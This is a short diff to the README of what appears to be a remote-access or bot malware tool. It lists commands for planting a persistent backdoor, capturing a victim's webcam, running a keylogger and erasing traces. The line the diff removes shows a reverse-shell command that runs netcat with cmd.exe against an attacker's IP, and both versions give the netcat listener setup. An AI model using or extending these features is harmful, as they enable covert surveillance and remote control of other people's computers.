@@ -84,7 +84,7 @@ ENTER
 - /backdoor ```IP``` (Create a persistent backdoor)
 - /webcam ```IP```
 - /keylogger ```IP``` ```time in seconds```
-- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` ```IP to connect ($ip)``` (Download netcat and execute ```nc $ip 8888 -e cmd.exe``` use ```nc -lp 8888 -v``` to create a listener)
+- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` ```IP to connect ($ip)``` (First you most use ```nc -lp 8888 -v``` to create a listener)
 - <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 
 
 #### Ultra :squirrel: 
